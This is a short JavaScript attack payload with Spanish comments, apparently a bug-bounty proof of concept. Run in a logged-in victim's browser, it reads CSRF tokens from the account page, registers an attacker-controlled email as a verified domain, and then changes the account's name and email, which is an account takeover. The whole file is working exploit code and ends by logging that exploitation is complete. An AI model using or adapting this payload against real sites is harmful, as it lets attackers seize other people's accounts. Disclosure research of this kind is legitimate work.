(async () => {
  try {
    // 1. Obtener el CSRF token desde /my_account/info
    let r1 = await fetch('/my_account/info');
    let html1 = await r1.text();
    let csrf1 = html1.match(/<meta name="csrf-token" content="([^"]+)"/)[1];

    // 2. Enviar la petición POST a /my_accounts/verified_domains con el token
    await fetch('/my_accounts/verified_domains', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: new URLSearchParams({
        'authenticity_token': csrf1,
        'verified_domain[email]': 'jotita3+hacker1337@wearehackerone.com',
        'button': ''
      })
    });

    // 3. Volver a obtener nuevo CSRF token tras el POST
    let r2 = await fetch('/my_account/info');
    let html2 = await r2.text();
    let csrf2 = html2.match(/<meta name="csrf-token" content="([^"]+)"/)[1];

    // 4. Última petición para cambiar los datos de cuenta
    await fetch('/my_account/update_account_details', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: new URLSearchParams({
        'authenticity_token': csrf2,
        'account_name': 'poquita',
        'first_name': 'poc',
        'last_name': 'poc',
        'email': 'jotita3+hacker1337@wearehackerone.com',
        'phone_number': '',
        'button': ''
      })
    });

    console.log('Explotación completada');
  } catch (err) {
    console.error('Error en el payload:', err);
  }
})();
